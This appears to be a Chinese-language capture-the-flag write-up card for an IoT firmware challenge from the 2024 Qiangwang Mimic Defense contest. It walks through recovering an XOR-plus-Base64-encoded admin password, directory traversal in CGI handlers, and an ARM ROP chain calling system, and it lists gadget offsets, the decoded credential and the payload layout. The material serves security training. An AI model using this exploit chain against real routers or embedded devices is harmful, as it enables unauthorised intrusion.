---
title: "第八届强网拟态防御国际精英挑战赛 - WIN!致敬mt 复现"
category: misc
tags: ["强网拟态防御国际精英挑战赛", "misc", "IoT固件", "ARM-QEMU", "lighttpd", "CGI"]
signals: ["强网拟态防御国际精英挑战赛 2024", "IoT固件", "ARM-QEMU", "lighttpd", "CGI", "ARM-ROP", "XOR+Base64编码", "弱口令", "目录穿越", "file_upload", "IoT", "QEMU", "debian-armel-versatilepb", "scp"]
difficulty: hard
source: "https://www.ctfiot.com/283883.html"
tools: ["ARM", "IDA", "ROP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第八届强网拟态防御国际精英挑战赛 - WIN!致敬mt 复现

> 赛事：强网拟态防御国际精英挑战赛 2024 | 方向：misc | 难度：hard | 工具：ARM、IDA、ROP

## 一句话总结

第八届强网拟态防御IoT固件逆向,QEMU跑debian-armel-versatilepb,scp拉cgi-bin(auth.cgi/manage.cgi/upload.cgi/watch/session_check.cgi/lang.cgi)逆向XOR+Base64密码编码得8g323密码,目录穿越../rootkey+ARM ROP(libc base 0xb6e8f000+pop {lr}/pop {r0,lr}+system)cat flag到logs

## 攻击链

1. 1. QEMU启动debian-armel-versatilepb rootfs→scp下载/var/www/cgi-bin和lighttpd二进制→逆向auth.cgi(0x03FC限制+8段循环+XOR编码)|2. users.txt admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==→xor_key=N1K_ROUT3R(10字节)→base64+10字节循环XOR→密码8g323##a08h33zx33@!B!$$$$$$$|3. login+upload_pubkey(80字节payload_store)→set_publicfile(cnt1=80,cnt2=idx)→watch创建rootkey|4. 目录穿越:"../"*((0x60-15)//2) + "/rootkey" + "nik.gif" → download 触发 make_rop|5. ARM ROP: pop {lr};bx lr + pop {r0,lr};bx lr + system+ "cat /home/ctf/flag > /tmp/store/logs.txt"|6. manage(action=manage, rk=rootkey)执行ROP+manage(action=logs)读log得flag

## 关键 payload

```
users.txt admin:dlZ4bWFsdjUDaiYCeCUqfGYUEhBvFW97dmtxcA==|xor_key=N1K_ROUT3R|8g323##a08h33zx33@!B!$$$$$$$|libc=0xb6e8f000 pop_lr=0x00015b24+libc pop_r0_lr=0x0010c730+libc system=0x38d34+libc shm_addr=0xb6ffc000|rop=b'a'*0x24+p32(pop_lr)+p32(pop_r0_lr)+p32(args_addr)+p32(system)+cmd+'\0'|manage("action":"download","path":file_path) + manage("setid":"-1") + make_rop() + manage("action":"manage","rk":rootkey) + manage("action":"logs")
```

## 经验教训

1) IoT固件逆向流程:QEMU启动→scp/rsync拉二进制→IDA/Ghidra逆向→密码还原→web/管理接口漏洞; 2) auth.cgi密码编码:base64+10字节循环XOR(xor_key常硬编码在二进制); 3) ARM ROP gadget:pop {lr};bx lr(0x15b24+libc)+pop {r0,lr};bx lr(0x10c730+libc); 4) shm_addr(共享内存)用于存放system参数(命令字符串); 5) 目录穿越(./../)触发make_rop覆盖返回地址; 6) manage.cgi(rk参数)+upload_pubkey组合upload+set+manage链触发ROP

## 标签

IoT固件、ARM-QEMU、lighttpd、CGI、ARM-ROP、XOR+Base64编码、弱口令、目录穿越

## 参考来源

- https://www.ctfiot.com/283883.html
- 原文件：第八届强网拟态防御国际精英挑战赛_–_WIN！致敬mt_复现.full.md
